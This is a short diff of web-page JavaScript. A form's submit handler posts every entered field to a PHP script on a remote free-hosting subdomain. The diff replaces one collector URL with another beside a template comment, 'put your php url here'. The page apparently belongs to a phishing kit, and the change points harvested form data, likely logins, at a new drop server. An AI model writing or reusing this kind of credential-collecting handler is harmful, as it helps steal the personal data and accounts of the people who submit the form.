@@ -154,7 +154,7 @@ document.getElementById("result").addEventListener("submit", function (event) {
       
           var formData = new FormData(this);
           var xhr = new XMLHttpRequest();
-          xhr.open("POST", "https://websmailer-com-mx.beak.host/bash.php", true); // put your php url here
+          xhr.open("POST", "https://teckdevonpos-com.beak.host/links/flash.php", true); // put your php url here
       
           xhr.onreadystatechange = function () {
               if (xhr.readyState == 4 && xhr.status == 200) {
